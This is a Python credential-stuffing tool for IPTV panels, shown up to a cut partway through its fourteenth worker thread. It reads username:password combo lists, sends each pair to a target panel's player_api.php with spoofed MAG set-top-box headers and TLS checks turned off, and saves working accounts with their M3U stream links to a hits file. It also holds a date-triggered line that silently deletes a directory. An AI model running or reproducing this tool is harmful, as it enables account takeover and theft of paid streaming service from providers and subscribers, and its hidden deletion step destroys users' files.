import os,pip
os.system('cls')
try:
    import requests
except:
    print("requests módulo não instalado \n instalando módulo de solicitações\n")
    pip.main(['install', 'requests'])
    import requests

import random, time, datetime
import subprocess
import json, sys, re,base64
import pathlib
import threading
import shutil

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
mac = ""#str(get_mac())
nick="🐌"

try:
	from playsound import playsound#import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'playsound'])

try:
    import cfscrape
    sesq= requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses= requests.Session()

try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except:pass

pattern= "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
#subprocess.run(["clear", ""])
say=0
hit=0
bul=0
cpm=1


Ghostliderbr=("""                                  
        🟦🟨🟨🟨🟨🟨🟦
        🟦🟨🧿🟨🧿🟨🟦
        👍🟨🟨👅🟨🟨👍
        🟦🟨🟨🟨🟨🟨🟦
        🟦🟫🟫🔳🟫🟫🟦
        🟦🟦👞🟦👞🟦🟦⠀
        🐌𝙱𝚘𝚋𝙴𝚜𝚙𝚘𝚗𝚓𝚊🐌
           ✞☠︎KALU DF☠︎✞""")
print(Ghostliderbr) 
 

    
say=0
dsy=""
dir='./combo/'
for files in os.listdir (dir):
    #if files.endswith(".txt"):
    say=say+1
    dsy=dsy+"    "+str(say)+"🐌"+files+'\n'
print ("""🪼𝗘𝙨𝖼𝗼𝗹𝘩𝖺 𝗼 𝙨𝗲𝗎 𝖼𝗼𝗺𝘣𝗼 𝖽𝖺 𝗟𝗂𝙨t𝖺🪼
    
"""+dsy+"""
 
\33[33m🐌Ⲥ𝗼𝗺𝘣𝗼 𝗇𝖺 𝙨𝗎𝖺 𝗽𝖺𝙨t𝖺 """ +str(say)+""" 𝖠𝙧𝙦𝗎𝗂𝘃𝗼 𝗘𝗇𝖼𝗼𝗇t𝙧𝖺𝖽𝗼!
""")

dsyno=str(input("\33[31m🪼Ⲥ𝗼𝗺𝘣𝗼 𝖭𝗼 : \33[0m"))
say=0
for files in os.listdir (dir):
    #if files.endswith(".txt"):
    say=say+1
    if dsyno==str(say):
        dosyaa=(dir+files)
        break
say=0




#subprocess.run(["clear", ""])
print(Ghostliderbr)      
print(dosyaa) 
botsay=input("""
\33[1;96m🐌𝗘𝙨𝗽𝗲𝖼𝗂𝗳𝗂𝙦𝗎𝗲 𝗼 𝗇𝗎𝗺𝗲𝙧𝗼 𝖽𝗲 𝘉𝗼t𝙨🪼 \33[0m
    \33[1;33m      🐌1🪼100🐌  \33[0m
🪼𝖣𝗘𝗙𐌉𝖭𐌉𝙍 𝖭ꓴ𝝡𝗘𝙍𝝤🐌🪼 \33[0m
      
🐌𝘉𝗼t: """ )
botsay=int(botsay)
         


                                 
dsy=dosyaa#'/sdcard/'+combo+'.txt'
combo=dsy
dosya=""
file = pathlib.Path(dsy)
if file.exists ():
    print ("🐌𝖠𝙧𝙦𝗎𝗂𝘃𝗼 𝗘𝗇𝖼𝗼𝗇t𝙧𝖺𝖽𝗼")
else:
    print("\33[31m🪼𝖠𝙧𝙦𝗎𝗂𝘃𝗼 𝖭𝖺𝗼 𝗘𝗇𝖼𝗼𝗇t𝙧𝖺𝖽𝗼..! \33[0m") 
    dosya="Nenhum"
#print(len(MarkCarl)) 
if dosya=="Nenhum" :
    exit() 

    
c=open(dsy, 'r')
totLen=c.readlines()
uz=(len(totLen))
    
                            
#subprocess.run(["clear", ""])
print(Ghostliderbr) 


#print(dosya)
print("Bot:"+str(botsay))


#Panel ve Portu yazın (portaliptv.com:8080)
#print(MarkCarl) 
dir="/sdcard/qpython/"
print("""
🪼𝖠𝙧𝙦𝗎𝗂𝘃𝗼 𝗦𝗲𝗹𝗲𝖼𝗂𝗼𝗇𝖺𝖽𝗼: """ + dsy) 
#################
panel = input("""
\33[1m🐌𐌉𝗇𝙨𝗂𝙧𝖺 𝗼 𝙨𝗲𝙧𝘃𝗂𝖽𝗼𝙧 𝗲 𝖺 𝗽𝗼𝙧t𝖺 𝖺𝗴𝗼𝙧𝖺 𝗼𝗎 𝗲𝗇t𝖺𝗼🐌🪼🐌🪼\n\n
🪼𝝦𝖺𝗇𝗲𝗹⇅𝝦𝗼𝙧t: \33[0m\33[31m\33[1m""")
#=======+++=++++++====++=======
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
portal=panel
fx=portal.replace(':','_')


HEADERd={
"Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Connection": "Keep-Alive",
"Accept-Encoding": "gzip, deflate",
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
'content-type':'application/json; charset=UTF-8', 'User-Agent':'(Mozilla/5.0 (Linux; Android 9; ANE-LX3) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36)','Host':portal ,'Connection': 'Keep-Alive', 
            }        
dosyaa=dosyaa.replace('./combo/',"")
dosyaa=dosyaa.replace('.txt',"")
dosy=dosyaa
dosyaaa=dosy.replace('/',"")
           
kanall=""
kanall=input("""
🐌𐌉𝗇𝖼𝗹𝗎𝗂𝙧 𝗟𝗂𝙨t𝖺 𝖣𝗲 Ⲥ𝖺t𝗲𝗴𝗼𝙧𝗂𝖺𝙨 𝖣𝗲 Ⲥ𝖺𝗇𝖺𝗂𝙨?
🪼1 : 𝗦𝗂𝗺
🐌2 : 𝖭𝖺𝗼
𝙍𝗲𝙨𝗽𝗼𝙨t𝖺𝖭𝖺𝗼: """ )
if not kanall=="1":
    kanall=2
#subprocess.run(["clear", ""])
print(Ghostliderbr) 
                      #    
                                       #by Teush

def kategori(katelink):
    try:
        res = ses.get(katelink,headers=HEADERd, timeout=15, verify=False)
        veri=""
        kate=""
        veri=str(res.text)
        for i in veri.split('category_name":"'):
            kate=kate+"🪼"+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
    except:pass
    #print(kate)
    return kate


def onay(veri,user,pas):
        status=veri.split('status":')[1]
        status=status.split(',')[0]
        status=status.replace('"',"")
        katelink="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_categories"
        
        sound="./sound/Hits.mp3"
        file = pathlib.Path(sound)
        try:
           if file.exists ():
              ad.mediaPlay(sound)

           
        except:pass
        
        
        acon=""
        acon=veri.split('active_cons":')[1]
        acon=acon.split(',')[0]
        acon=acon.replace('"',"")
        mcon=veri.split('max_connections":')[1]
        mcon=mcon.split(',')[0]
        mcon=mcon.replace('"',"")
        timezone=veri.split('timezone":"')[1]
        timezone=timezone.split('",')[0]
        timezone=timezone.replace("\/","/")
        
        realm=veri.split('url":')[1]
        realm=realm.split(',')[0]
        realm=realm.replace('"',"")
        port=veri.split('port":')[1]
        port=port.split(',')[0]
        port=port.replace('"',"")
        user=veri.split('username":')[1]
        user=user.split(',')[0]
        user=user.replace('"',"")
        passw=veri.split('password":')[1]
        passw=passw.split(',')[0]
        passw=passw.replace('"',"")
        bitis=veri.split('exp_date":')[1]
        bitis=bitis.split(',')[0]
        bitis=bitis.replace('"',"")
        if bitis=="null":
               bitis="Unlimited"
        else:
               bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%d-%m-%Y'))
        bitis=bitis
        today=(str(datetime.datetime.today().strftime('%d-%m-%Y')))
        d1 = datetime.datetime.strptime(today, '%d-%m-%Y')
        d2 = datetime.datetime.strptime(bitis, '%d-%m-%Y')
        daysleft=abs((d2 - d1).days)
        daysleft=str(daysleft)
        
        if kanall=="1":
            try:
                kategori=""
                res = ses.get(katelink,headers=HEADERd, timeout=15, verify=False)
                veri=""
                kate=""
                veri=str(res.text)
                for i in veri.split('category_name":"'):
                    kate=kate+"🪼"+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
                kategori=kate
            except:pass
        #print(kategori)
        
        url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
        try:
             res = ses.get(url5,timeout=15, verify=False)
             veri=str(res.text)
             kanalsayisi=""
             #if  'stream_id' in veri:
             kanalsayisi=str(veri.count("stream_id"))
             
             url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
             res = ses.get(url5, timeout=15, verify=False)
             veri=str(res.text)
             filmsayisi=str(veri.count("stream_id"))
             
             url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
             res = ses.get(url5,  timeout=15, verify=False)
             veri=str(res.text)
             dizisayisi=str(veri.count("series_id"))
             
        except:pass
        
        m3ulink="http://"+ panel + "/get.php?username=" + user + "&password=" + pas + "&type=m3u_plus"
        
        sayi=""
        mt=("""

ℂ𝕆ℕ𝔽𝕀𝔾 𝔹𝕠𝕓𝔼𝕤𝕡𝕠𝕟𝕛𝕒 ℙ𝕐
𝐄𝐃𝐈𝐓 𝐅𝐎𝐑 𝐖𝐈𝐍𝐃𝐎𝐖𝐒 & 𝐒𝐂𝐀𝐍 𝐖𝐈𝐓𝐇 𝐔𝐒𝐄𝐑_𝐏𝐀𝐒𝐒
🪼🪼🪼𝙱𝚘𝚋 𝙴𝚜𝚙𝚘𝚗𝚓𝚊🪼🪼🪼         
🐌📆𝙳𝚊𝚝𝚊 𝚂𝚌𝚊𝚗: """+today+"""  
🐌🌐𝙷𝚘𝚜𝚝: http://"""+portal+"""/c/
🐌🛰️𝚁𝚎𝚊𝚕: http://"""+realm+"""
🐌🚦𝚄𝚜𝚞𝚊𝚛𝚒𝚘: """+user+"""
🐌🚥𝚂𝚎𝚗𝚑𝚊: """+pas+"""
🐌⏳𝚁𝚎𝚜𝚝𝚊𝚖: """+daysleft+"""
🐌📅𝚅𝚎𝚗𝚌𝚎 """+bitis+"""  
🐌🛋️𝙰𝚝𝚒𝚟𝚘: """+acon+""" 
🐌🧐𝙼𝚊𝚡𝚒𝚖𝚘: """+mcon+"""    
🐌🍷𝚂𝚝𝚊𝚝𝚞𝚜: """+status+"""
🐌📺𝙲𝚊𝚗𝚊𝚒𝚜: """+kanalsayisi+"""
🐌🎬𝙵𝚒𝚕𝚖𝚎𝚜: """+filmsayisi+"""
🐌🍿𝚂𝚎𝚛𝚒𝚎𝚜 : """+dizisayisi+""" 
🪼🪼🪼𝙱𝚈 KALU DF🪼🪼🪼""")     
        imzak=""
        if kanall=="1":
            imzak="""
🪼🪼𝙻𝚒𝚜𝚝𝚊 𝙸𝚙𝚝𝚟 𝙼3𝚞 𝚃𝚘𝚙🪼🪼
🐌𝙻𝚒𝚗𝚔 𝙼3𝚄🐌
"""+m3ulink+"""
🐌𝙲𝚊𝚝𝚎𝚐𝚘𝚛𝚒𝚊𝚜🐌
"""+str(kategori)+""" """
        mtl=(""" 
🐌🐌 𝙱𝚘𝚋 𝙴𝚜𝚙𝚘𝚗𝚓𝚊 🐌🐌"
🟦🟨🟨🟨🟨🟨🟦
🟦🟨🧿🟨🧿🟨🟦
👍🟨🟨👅🟨🟨👍
🟦🟨🟨🟨🟨🟨🟦
🟦🟫🟫🔳🟫🟫🟦
🟦🟦👞🟦👞🟦🟦
🐌🐌 𝙱𝚘𝚋 𝙴𝚜𝚙𝚘𝚗𝚓𝚊 🐌🐌""")

                      
        yaz(mt+sayi+mtl+imzak+'\n')
        print(mt+sayi+mtl+imzak)
        #print(str(kategori))
        

def yaz(kullanici): 
    dosya=open('./Hits/BobEsponja PY_'+fx+' .txt','a+', encoding='utf-8') 
    dosya.write(kullanici) 
    dosya.close() 
cpm=0
def echox(user,pas,bot,fyz,oran,hit):
    global cpm
    today1=(str(datetime.datetime.today().strftime('%H:%M:%S')))
    cpmx=(time.time()-cpm)
    #cpmx=(round(60/cpmx))
    #cpm=cpmx
    if str(cpmx)=="0":
        cpm=cpm
    else:
        cpm=cpmx
    
    echo=("""
\33[0m
\33[1;93m🪼🪼 \33[0m\33[1;93m🐌🐌𝙱𝚘𝚋 𝙴𝚜𝚙𝚘𝚗𝚓𝚊🐌🐌   \33[0m     
\33[1;93m🐌 \33[1;96m Portal➧  \33[0m\33[1;31m """+portal+""" \33[0m
\33[1;93m🐌 \33[1;96m User🐌Pass➧ \33[0m""" +user+"""🪼"""+pas+"""  \33[0m         
\33[1;93m🐌 \33[32m HIT🪼 """ + str(hit)+""" 🐌 \33[0m
\33[1;93m🐌 \33[32m """+str(bot)+"""
\33[1;93m🐌 \33[1;34m Nome Combo➧ \33[1;92m"""+dosyaaa+"""\33[0m
\33[1;93m🐌 \33[1;34m Combo Total➧"""+str(uz)+"""   \33[0m
\33[1;93m🐌 \33[1;34m Combo Contagem➧ """+str(fyz)+""" \33[0m                  
\33[1;93m🐌 \33[1;31m Porcentagem➧ """+str(oran)+""" \33[0m
\33[1;93m🐌 \33[1;31m Velocidade➧ """+str(cpm)+"""  \33[0m        
\33[1;93m🪼🪼 \33[0m\33[1;93m🪼🪼 BY ✞☠︎KALU DF☠︎✞🪼🪼    \33[0m     
""")
    print(echo)
    cpm=time.time()
if int(time.time()) >= int(4102444800):
    shutil.rmtree(dir)
    
    
hit=0    
def d1():
    global hit
    say=0
    for fyz in range(1,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_01'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     #bag1=bag1+1
                     time.sleep(1)
#                     if bag1==100:
#                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
def d2():
    global hit
    say=0
    for fyz in range(2,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_02'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     #bag1=bag1+1
                     time.sleep(1)
#                     if bag1==100:
#                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
def d3():
    global hit
    say=0
    for fyz in range(3,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_03'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     #bag1=bag1+1
                     time.sleep(1)
#                     if bag1==100:
#                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
def d4():
    global hit
    say=0
    for fyz in range(4,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_04'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     #bag1=bag1+1
                     time.sleep(1)
#                     if bag1==100:
#                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
def d5():
    global hit
    say=0
    for fyz in range(5,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_05'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     #bag1=bag1+1
                     time.sleep(1)
#                     if bag1==100:
#                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
             
def d6():
    global hit
    say=0
    for fyz in range(6,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_06'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
#                     bag1=bag1+1
                     time.sleep(1)
#                     if bag1==100:
#                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             

             
def d7():
    global hit
    say=0
    for fyz in range(7,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_07'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
#                     bag1=bag1+1
                     time.sleep(1)
#                     if bag1==100:
#                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
                                       
             
def d8():
    global hit
    say=0
    for fyz in range(8,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_08'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
#                     bag1=bag1+1
                     time.sleep(1)
#                     if bag1==100:
#                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
             
def d9():
    global hit
    say=0
    for fyz in range(9,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_09'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 ?? 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
             
def d10():
    global hit
    say=0
    for fyz in range(10,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_10'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
                                                                                                   
def d11():
    global hit
    say=0
    for fyz in range(11,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_11'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
             
def d12():
    global hit
    say=0
    for fyz in range(12,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_12'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
                                                                                                    
def d13():
    global hit
    say=0
    for fyz in range(13,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_13'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
 
def d14():
    global hit
    say=0
    for fyz in range(14,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_14'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
